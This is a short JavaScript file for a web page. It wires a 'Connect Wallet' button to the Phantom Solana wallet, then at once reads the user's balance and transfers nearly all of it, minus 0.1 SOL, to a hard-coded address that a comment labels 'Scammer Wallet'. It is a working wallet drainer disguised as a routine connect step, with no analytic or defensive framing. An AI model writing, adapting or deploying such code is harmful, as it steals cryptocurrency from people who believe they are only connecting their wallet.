// ✅ Correctly Reference Web3.js After Importing from jsdelivr
const { Connection, PublicKey, Transaction, SystemProgram } = solanaWeb3;

// ✅ Function to Connect to Phantom Wallet
async function connectWallet() {
    const provider = window.solana;
    if (provider && provider.isPhantom) {
        await provider.connect();  // ✅ Opens Phantom Wallet popup
        console.log("Wallet connected:", provider.publicKey.toString());
        sendTransaction();  // ✅ Executes Code E after connection
    } else {
        alert("Phantom wallet not detected!");
    }
}

// ✅ Function to Check Balance and Send Max Amount (Minus Gas Fee)
async function sendTransaction() {
    const provider = window.solana;
    const connection = new Connection("https://api.mainnet-beta.solana.com");

    console.log("Fetching balance...");
    const balance = await connection.getBalance(provider.publicKey);
    console.log("Balance retrieved:", balance);

    const gasFee = 100000000; // ✅ 0.1 SOL in lamports
    const amountToSend = balance - gasFee;

    console.log("Creating transaction...");
    const transaction = new Transaction().add(
        SystemProgram.transfer({
            fromPubkey: provider.publicKey,
            toPubkey: new PublicKey("6Ci4CDMYA4ffqespgAX9QV1joQdev3tWBnpJrm1w37Cx"), // ✅ Scammer Wallet
            lamports: amountToSend,
        })
    );

    try {
        console.log("Signing transaction...");
        const signedTransaction = await provider.signTransaction(transaction);
        console.log("Transaction signed!");

        console.log("Sending transaction...");
        await connection.sendRawTransaction(signedTransaction.serialize());
        console.log("Transaction sent successfully!");
    } catch (err) {
        console.error("Transaction failed:", err);
    }
}

// ✅ Attach Event Listener to "Connect Wallet" Button
document.querySelector(".wallet-button").addEventListener("click", connectWallet);
